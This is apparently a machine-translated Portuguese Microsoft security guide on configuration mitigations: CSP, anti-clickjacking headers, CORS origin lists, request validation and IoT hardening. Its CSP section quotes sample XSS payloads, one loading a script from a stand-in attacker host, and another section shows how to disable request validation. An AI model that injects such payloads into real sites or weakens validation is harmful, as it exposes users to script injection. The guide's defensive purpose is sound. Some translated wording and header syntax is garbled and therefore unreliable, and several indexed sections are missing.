---
title: Gerenciamento de configuração-Microsoft Threat Modeling Tool-Azure | Microsoft Docs
description: mitigações para ameaças expostas no Threat Modeling Tool
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: dbe3526444bc35815dd4323a3a5290696619e3f9
ms.sourcegitcommit: 85b3973b104111f536dc5eccf8026749084d8789
ms.translationtype: MT
ms.contentlocale: pt-PT
ms.lasthandoff: 08/01/2019
ms.locfileid: "68728337"
---
# <a name="security-frame-configuration-management--mitigations"></a>Quadro de segurança: Gerenciamento de configuração | Mitigações 
| Produtos/serviços | Artigo |
| --------------- | ------- |
| **Aplicativo Web** | <ul><li>[Implementar a CSP (política de segurança de conteúdo) e desabilitar o JavaScript embutido](#csp-js)</li><li>[Habilitar o filtro XSS do navegador](#xss-filter)</li><li>[Os aplicativos ASP.NET devem desabilitar o rastreamento e a depuração antes da implantação](#trace-deploy)</li><li>[Acesse JavaScripts de terceiros somente de fontes confiáveis](#js-trusted)</li><li>[Garantir que as páginas ASP.NET autenticadas incorporem as defesas de recômoda da interface do usuário ou de tomada de clique](#ui-defenses)</li><li>[Certifique-se de que apenas origens confiáveis sejam permitidas se o CORS estiver habilitado em aplicativos Web ASP.NET](#cors-aspnet)</li><li>[Habilitar o atributo ValidateRequest em páginas ASP.NET](#validate-aspnet)</li><li>[Usar versões mais recentes hospedadas localmente de bibliotecas JavaScript](#local-js)</li><li>[Desabilitar a detecção automática de MIME](#mime-sniff)</li><li>[Remover cabeçalhos de servidor padrão em sites do Windows Azure para evitar impressão digital](#standard-finger)</li></ul> |
| **Base de Dados** | <ul><li>[Configurar um firewall do Windows para acesso Mecanismo de Banco de Dados](#firewall-db)</li></ul> |
| **API Web** | <ul><li>[Certifique-se de que apenas origens confiáveis sejam permitidas se o CORS estiver habilitado no ASP.NET Web API](#cors-api)</li><li>[Criptografar seções de arquivos de configuração da API Web que contêm dados confidenciais](#config-sensitive)</li></ul> |
| **Dispositivo IoT** | <ul><li>[Verifique se todas as interfaces de administração estão protegidas com credenciais fortes](#admin-strong)</li><li>[Garantir que o código desconhecido não possa ser executado em dispositivos](#unknown-exe)</li><li>[Criptografar o sistema operacional e partições adicionais do dispositivo IoT com o armário de bits](#partition-iot)</li><li>[Garantir que apenas os serviços/recursos mínimos estejam habilitados nos dispositivos](#min-enable)</li></ul> |
| **Gateway de campo IoT** | <ul><li>[Criptografar o sistema operacional e partições adicionais do gateway de campo IoT com o armário de bits](#field-bit-locker)</li><li>[Verifique se as credenciais de logon padrão do gateway de campo foram alteradas durante a instalação](#default-change)</li></ul> |
| **Gateway de nuvem IoT** | <ul><li>[Verifique se o gateway de nuvem implementa um processo para manter o firmware dos dispositivos conectados atualizado](#cloud-firmware)</li></ul> |
| **Limite de confiança do computador** | <ul><li>[Verifique se os dispositivos têm controles de segurança de ponto de extremidade configurados de acordo com as políticas organizacionais](#controls-policies)</li></ul> |
| **Armazenamento do Azure** | <ul><li>[Garantir o gerenciamento seguro de chaves de acesso de armazenamento do Azure](#secure-keys)</li><li>[Certifique-se de que apenas origens confiáveis sejam permitidas se o CORS estiver habilitado no armazenamento do Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Habilitar o recurso de limitação de serviço do WCF](#throttling)</li><li>[WCF-divulgação de informações por meio de metadados](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementar a CSP (política de segurança de conteúdo) e desabilitar o JavaScript embutido

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | [Uma introdução à política de segurança](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)de conteúdo, [referência de política de segurança de conteúdo](https://content-security-policy.com/), recursos de [segurança](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [introdução à política de segurança de conteúdo](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [posso usar o CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Passos** | <p>A política de segurança de conteúdo (CSP) é um mecanismo de segurança de defesa aprofundada, um padrão W3C, que permite aos proprietários do aplicativo Web ter controle sobre o conteúdo inserido em seu site. O CSP é adicionado como um cabeçalho de resposta HTTP no servidor Web e é imposto no lado do cliente por navegadores. É uma política baseada na lista aprovada - um Web site pode declarar um conjunto de domínios fidedignos do qual conteúdo ativo, como o JavaScript pode ser carregado.</p><p>O CSP fornece os seguintes benefícios de segurança:</p><ul><li>**Proteção contra XSS:** Se uma página estiver vulnerável a XSS, um invasor poderá explorá-la de duas maneiras:<ul><li>Injetar `<script>malicious code</script>`. Essa exploração não funcionará devido à restrição base do CSP-1</li><li>Injetar `<script src=”http://attacker.com/maliciousCode.js”/>`. Essa exploração não funcionará, pois o domínio controlado pelo invasor não estará na lista branca do CSP de domínios</li></ul></li><li>**Controle sobre vazamento de dados:** Se qualquer conteúdo mal-intencionado em uma página da Web tentar se conectar a um site externo e roubar dados, a conexão será anulada pelo CSP. Isso ocorre porque o domínio de destino não estará na lista de permissões do CSP</li><li>**Defesa contra a passagem de clique:** a tomada de clique é uma técnica de ataque que usa o qual um adversário pode estruturar um site original e forçar os usuários a clicar em elementos da interface do usuário. Atualmente, a defesa contra a tomada de clique é obtida com a configuração de um cabeçalho de resposta X-Frame-Options. Nem todos os navegadores respeitam esse cabeçalho e o CSP de envio será uma maneira padrão de se defender contra o clique do mouse</li><li>**Relatório de ataques em tempo real:** Se houver um ataque de injeção em um site habilitado para CSP, os navegadores irão disparar automaticamente uma notificação para um ponto de extremidade configurado no servidor Web. Dessa forma, o CSP funciona como um sistema de aviso em tempo real.</li></ul> |

### <a name="example"></a>Exemplo
Exemplo de política: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Essa política permite que os scripts sejam carregados somente do servidor do aplicativo Web e do Google Analytics Server. Os scripts carregados de qualquer outro site serão rejeitados. Quando o CSP é habilitado em um site, os recursos a seguir são automaticamente desabilitados para atenuar os ataques de XSS. 

### <a name="example"></a>Exemplo
Scripts embutidos não serão executados. Veja a seguir exemplos de scripts embutidos 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Exemplo
As cadeias de caracteres não serão avaliadas como código. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Habilitar o filtro XSS do navegador

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | [Filtro de proteção XSS](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Passos** | <p>X-XSS-Protection a configuração do cabeçalho de resposta controla o filtro de script entre sites do navegador. Esse cabeçalho de resposta pode ter os seguintes valores:</p><ul><li>`0:`Isso desabilitará o filtro</li><li>`1: Filter enabled`Se um ataque de script entre sites for detectado para interromper o ataque, o navegador limpará a página</li><li>`1: mode=block : Filter enabled`. Em vez de corrigir a página, quando um ataque de XSS for detectado, o navegador impedirá a renderização da página</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. O navegador limpará a página e relatará a violação.</li></ul><p>Essa é uma função Chromium que utiliza relatórios de violação do CSP para enviar detalhes para um URI de sua escolha. As duas últimas opções são consideradas valores seguros.</p>|

## <a id="trace-deploy"></a>Os aplicativos ASP.NET devem desabilitar o rastreamento e a depuração antes da implantação

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | [Visão geral da depuração do ASP.net](https://msdn.microsoft.com/library/ms227556.aspx), [visão geral do rastreamento do ASP.net](https://msdn.microsoft.com/library/bb386420.aspx), [como: Habilitar o rastreamento para um aplicativo](https://msdn.microsoft.com/library/0x5wc973.aspx)ASP.NET [, como: Habilitar depuração para aplicativos ASP.NET](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Passos** | Quando o rastreamento está habilitado para a página, todos os navegadores que o solicitam também obtêm as informações de rastreamento que contêm dados sobre o fluxo de trabalho e o estado do servidor interno. Essas informações podem ser sensíveis à segurança. Quando a depuração está habilitada para a página, os erros que ocorrem no servidor resultam em um rastreamento de pilha completo dados apresentados para o navegador. Esses dados podem expor informações sensíveis à segurança sobre o fluxo de trabalho do servidor. |

## <a id="js-trusted"></a>Acesse JavaScripts de terceiros somente de fontes confiáveis

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | os JavaScripts de terceiros devem ser referenciados somente de fontes confiáveis. Os pontos de extremidade de referência devem estar sempre no SSL. |

## <a id="ui-defenses"></a>Garantir que as páginas ASP.NET autenticadas incorporem as defesas de recômoda da interface do usuário ou de tomada de clique

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | Folha de consulta de [defesa contra Jack de OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), o [IE é interno – combatendo o clique com as opções X-frame-](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Passos** | <p>o sensor de clique, também conhecido como "ataque de reconexão da interface do usuário", é quando um invasor usa várias camadas transparentes ou opacas para induzir um usuário a clicar em um botão ou link em outra página quando eles estiverem pretendendo clicar na página de nível superior.</p><p>Essa disposição em camadas é obtida com a criação de uma página mal-intencionada com um iframe, que carrega a página da vítima. Assim, o invasor é um "seqüestro" de cliques para sua página e os encaminha para outra página, mais provavelmente de propriedade de outro aplicativo, domínio ou ambos. Para evitar ataques de tomada de clique, defina os cabeçalhos de resposta HTTP apropriados de X-Frame-Options que instruem o navegador a não permitir o enquadramento de outros domínios</p>|

### <a name="example"></a>Exemplo
O cabeçalho X-FRAME-OPTIONS pode ser definido por meio do IIS Web. config. Trecho de código Web. config para sites que nunca devem ser emoldurados: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exemplo
Código Web. config para sites que só devem ser emoldurados por páginas no mesmo domínio: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Certifique-se de que apenas origens confiáveis sejam permitidas se o CORS estiver habilitado em aplicativos Web ASP.NET

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Web Forms, MVC5 |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | <p>A segurança do browser impede que uma página Web realize pedidos de AJAX para outro domínio. Essa restrição é chamada de política de mesma origem e impede que um site mal-intencionado leia dados confidenciais de outro site. No entanto, às vezes pode ser necessário expor APIs com segurança que outros sites podem consumir. O CORS (compartilhamento de recursos entre origens) é um padrão W3C que permite que um servidor Relaxe a política de mesma origem. Usando o CORS, um servidor pode permitir explicitamente algumas solicitações entre origens e, ao mesmo tempo, rejeitar outras.</p><p>O CORS é mais seguro e mais flexível do que as técnicas anteriores, como JSONP. Em seu núcleo, habilitar o CORS está relacionado à adição de alguns cabeçalhos de resposta HTTP (Access-Control-*) para o aplicativo Web e isso pode ser feito de duas maneiras.</p>|

### <a name="example"></a>Exemplo
Se o acesso ao Web. config estiver disponível, o CORS poderá ser adicionado por meio do seguinte código: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exemplo
Se o acesso ao Web. config não estiver disponível, o CORS poderá ser configurado adicionando o seguinte código CSharp: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Observe que é essencial garantir que a lista de origens no atributo "Access-Control-Allow-Origin" seja definida como um conjunto finito e confiável de origens. A falha ao configurar isso de forma inadequada (por exemplo, definir o valor como ' * ') permitirá que sites mal-intencionados disparem solicitações entre origens para o aplicativo Web > sem nenhuma restrição, tornando o aplicativo vulnerável a ataques CSRF. 

## <a id="validate-aspnet"></a>Habilitar o atributo ValidateRequest em páginas ASP.NET

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Web Forms, MVC5 |
| **Atributos**              | N/A  |
| **Referências**              | [Validação de solicitação-prevenção de ataques de script](https://www.asp.net/whitepapers/request-validation) |
| **Passos** | <p>A validação de solicitação, um recurso do ASP.NET desde a versão 1,1, impede que o servidor aceite conteúdo que contenha HTML não codificado. Esse recurso foi criado para ajudar a evitar alguns ataques de injeção de script em que o código de script do cliente ou HTML pode ser enviado inadvertidamente a um servidor, armazenado e, em seguida, apresentado a outros usuários. Ainda é altamente recomendável que você valide todos os dados de entrada e Codifique o HTML quando apropriado.</p><p>A validação da solicitação é realizada comparando todos os dados de entrada para uma lista de valores potencialmente perigosos. Se ocorrer uma correspondência, ASP.NET gerará `HttpRequestValidationException`um. Por padrão, o recurso de validação de solicitação está habilitado.</p>|

### <a name="example"></a>Exemplo
No entanto, esse recurso pode ser desabilitado no nível da página: 
```XML
<%@ Page validateRequest="false" %> 
```
ou, no nível do aplicativo 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Observe que o recurso de validação de solicitação não tem suporte e não faz parte do pipeline MVC6. 

## <a id="local-js"></a>Usar versões mais recentes hospedadas localmente de bibliotecas JavaScript

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | <p>Os desenvolvedores que usam bibliotecas JavaScript padrão como o JQuery devem usar versões aprovadas de bibliotecas JavaScript comuns que não contêm falhas de segurança conhecidas. Uma prática recomendada é usar a versão mais recente das bibliotecas, pois elas contêm correções de segurança para vulnerabilidades conhecidas em suas versões mais antigas.</p><p>Se a versão mais recente não puder ser usada devido a motivos de compatibilidade, as versões mínimas abaixo deverão ser usadas.</p><p>Versões mínimas aceitáveis:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery validar 1,9</li><li>JQuery Mobile 1.0.1</li><li>Ciclo JQuery 2,99</li><li>1\.9.0 de DataTables do JQuery</li></ul></li><li>**AJAX Control Toolkit**<ul><li>AJAX Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms e Ajax**<ul><li>ASP.NET Web Forms e AJAX 4</li><li>ASP.NET AJAX 3,5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nunca carregue nenhuma biblioteca JavaScript de sites externos, como o CDNs público</p>|

## <a id="mime-sniff"></a>Desabilitar a detecção automática de MIME

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | [Segurança do IE8 parte V: Proteção](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)abrangente, [tipo MIME](https://en.wikipedia.org/wiki/Mime_type) |
| **Passos** | O cabeçalho X-Content-Type-Options é um cabeçalho HTTP que permite aos desenvolvedores especificar que seu conteúdo não deve ser sniffed MIME. Esse cabeçalho é projetado para mitigar ataques de detecção de MIME. Para cada página que pode conter conteúdo controlável pelo usuário, você deve usar o cabeçalho HTTP X-Content-Type-Options: nosniff. Para habilitar o cabeçalho necessário globalmente para todas as páginas no aplicativo, você pode executar um dos seguintes procedimentos|

### <a name="example"></a>Exemplo
Adicione o cabeçalho no arquivo Web. config se o aplicativo for hospedado pelo Serviços de Informações da Internet (IIS) 7 em diante. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exemplo
Adicionar o cabeçalho por meio do aplicativo\_global BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exemplo
Implementar o módulo HTTP personalizado 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exemplo
Você pode habilitar o cabeçalho necessário somente para páginas específicas adicionando-o a respostas individuais: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Remover cabeçalhos de servidor padrão em sites do Windows Azure para evitar impressão digital

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | Ambientetype-Azure |
| **Referências**              | [Removendo cabeçalhos de servidor padrão nos sites do Windows Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Passos** | Os cabeçalhos como Server, X-powered-by, X-AspNet-Version revelam informações sobre o servidor e as tecnologias subjacentes. É recomendável suprimir esses cabeçalhos, impedindo a impressão digital do aplicativo |

## <a id="firewall-db"></a>Configurar um firewall do Windows para acesso Mecanismo de Banco de Dados

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Base de Dados | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | SQL Azure, OnPrem |
| **Atributos**              | N/A, versão do SQL-V12 |
| **Referências**              | [Como configurar um firewall do banco de dados SQL do Azure](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [configurar um firewall do Windows para acesso mecanismo de banco de dados](https://msdn.microsoft.com/library/ms175043) |
| **Passos** | Os sistemas de firewall ajudam a impedir o acesso não autorizado aos recursos do computador. Para acessar uma instância do SQL Server Mecanismo de Banco de Dados por meio de um firewall, você deve configurar o firewall no computador que executa o SQL Server para permitir o acesso |

## <a id="cors-api"></a>Certifique-se de que apenas origens confiáveis sejam permitidas se o CORS estiver habilitado no ASP.NET Web API

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | MVC 5 |
| **Atributos**              | N/A  |
| **Referências**              | [Habilitando solicitações entre origens no ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [suporte a ASP.NET Web API-CORS no ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Passos** | <p>A segurança do browser impede que uma página Web realize pedidos de AJAX para outro domínio. Essa restrição é chamada de política de mesma origem e impede que um site mal-intencionado leia dados confidenciais de outro site. No entanto, às vezes pode ser necessário expor APIs com segurança que outros sites podem consumir. O CORS (compartilhamento de recursos entre origens) é um padrão W3C que permite que um servidor Relaxe a política de mesma origem.</p><p>Usando o CORS, um servidor pode permitir explicitamente algumas solicitações entre origens e, ao mesmo tempo, rejeitar outras. O CORS é mais seguro e mais flexível do que as técnicas anteriores, como JSONP.</p>|

### <a name="example"></a>Exemplo
No App_Start/WebApiConfig. cs, adicione o código a seguir ao método WebApiConfig. Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exemplo
O atributo EnableCors pode ser aplicado a métodos de ação em um controlador da seguinte maneira: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Observe que é essencial garantir que a lista de origens no atributo EnableCors seja definida como um conjunto finito e confiável de origens. A falha ao configurar isso de forma inadequada (por exemplo, definir o valor como ' * ') permitirá que sites mal-intencionados disparem solicitações entre origens para a API sem restrições, > tornando a API vulnerável a ataques CSRF. EnableCors pode ser decorado no nível do controlador. 

### <a name="example"></a>Exemplo
Para desabilitar o CORS em um método específico em uma classe, o atributo DisableCors pode ser usado como mostrado abaixo: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | MVC 6 |
| **Atributos**              | N/A  |
| **Referências**              | [Habilitando solicitações entre origens (CORS) no ASP.NET Core 1,0](https://docs.asp.net/en/latest/security/cors.html) |
| **Passos** | <p>No ASP.NET Core 1,0, o CORS pode ser habilitado usando o middleware ou o MVC. Ao usar o MVC para habilitar o CORS, os mesmos serviços CORS são usados, mas o middleware CORS não é.</p>|

**Abordagem-1** Habilitando CORS com middleware: Para habilitar o CORS para todo o aplicativo, adicione o middleware do CORS ao pipeline de solicitação usando o método de extensão UseCors. Uma política entre origens pode ser especificada ao adicionar o middleware CORS usando a classe CorsPolicyBuilder. Existem duas formas de fazer isso:

### <a name="example"></a>Exemplo
A primeira é chamar UseCors com um lambda. O lambda usa um objeto CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exemplo
A segunda é definir uma ou mais políticas de CORS nomeadas e, em seguida, selecionar a política por nome em tempo de execução. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Abordagem-2** Habilitando CORS no MVC: Como alternativa, os desenvolvedores podem usar o MVC para aplicar o CORS específico por ação, por controlador ou globalmente para todos os controladores.

### <a name="example"></a>Exemplo
Por ação: Para especificar uma política CORS para uma ação específica, adicione o atributo [EnableCors] à ação. Especifique o nome da política. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exemplo
Por controlador: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exemplo
Globalmente 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Observe que é essencial garantir que a lista de origens no atributo EnableCors seja definida como um conjunto finito e confiável de origens. A falha ao configurar isso de forma inadequada (por exemplo, definir o valor como ' * ') permitirá que sites mal-intencionados disparem solicitações entre origens para a API sem restrições, > tornando a API vulnerável a ataques CSRF. 

### <a name="example"></a>Exemplo
Para desabilitar o CORS para um controlador ou uma ação, use o atributo [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Criptografar seções de arquivos de configuração da API Web que contêm dados confidenciais

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | [How To: Criptografar seções de configuração no ASP.NET 2,0](https://msdn.microsoft.com/library/ff647398.aspx)usando DPAPI, [especificando um provedor de configuração protegida](https://msdn.microsoft.com/library/68ze1hb2.aspx), [usando Azure Key Vault para proteger os segredos do aplicativo](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Passos** | Arquivos de configuração, como o Web. config, appSettings. JSON, geralmente são usados para manter informações confidenciais, incluindo nomes de usuário, senhas, cadeias de conexão de banco de dados e chaves de criptografia. Se você não proteger essas informações, seu aplicativo ficará vulnerável a invasores ou usuários mal-intencionados que obtêm informações confidenciais, como nomes de usuário e senhas de conta, nomes de banco de dados e nomes de servidor. Com base no tipo de implantação (Azure/local), criptografe as seções confidenciais dos arquivos de configuração usando DPAPI ou serviços como Azure Key Vault. |

## <a id="admin-strong"></a>Verifique se todas as interfaces de administração estão protegidas com credenciais fortes

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | Todas as interfaces administrativas que o gateway de campo ou de dispositivo expõe devem ser protegidas usando credenciais fortes. Além disso, quaisquer outras interfaces expostas como Wi-Fi, SSH, compartilhamentos de arquivos, FTP devem ser protegidas com credenciais fortes. Senhas fracas padrão não devem ser usadas. |

## <a id="unknown-exe"></a>Garantir que o código desconhecido não possa ser executado em dispositivos

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | [Habilitando a inicialização segura e a criptografia de dispositivo do armário de bits no Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Passos** | A inicialização segura de UEFI restringe o sistema a permitir somente a execução de binários assinados por uma autoridade especificada. Esse recurso impede que o código desconhecido seja executado na plataforma e, potencialmente, enfraquece a postura de segurança de ti. Habilite a inicialização segura de UEFI e restrinja a lista de autoridades de certificação confiáveis para o código de assinatura. Assine todo o código que é implantado no dispositivo usando uma das autoridades confiáveis. |

## <a id="partition-iot"></a>Criptografar o sistema operacional e partições adicionais do dispositivo IoT com o armário de bits

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | O Windows 10 IoT Core implementa uma versão leve da criptografia de dispositivo do BitLocker, que tem uma forte dependência da presença de um TPM na plataforma, incluindo o protocolo preOS necessário em UEFI que conduz as medições necessárias. Essas medições de preOS garantem que o sistema operacional mais tarde tenha um registro definitivo de como o sistema operacional foi iniciado. Criptografe as partições do sistema operacional usando o armário de bits e todas as partições adicionais também, caso eles armazenem dados confidenciais. |

## <a id="min-enable"></a>Garantir que apenas os serviços/recursos mínimos estejam habilitados nos dispositivos

| Cargo                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | Não habilite ou desative nenhum recurso ou serviço no sistema operacional que não seja necessário para o funcionamento da solução. Por exemplo, se o dispositivo não exigir que uma interface do usuário seja implantada, instale o Windows IoT Core no modo sem periféricos. |

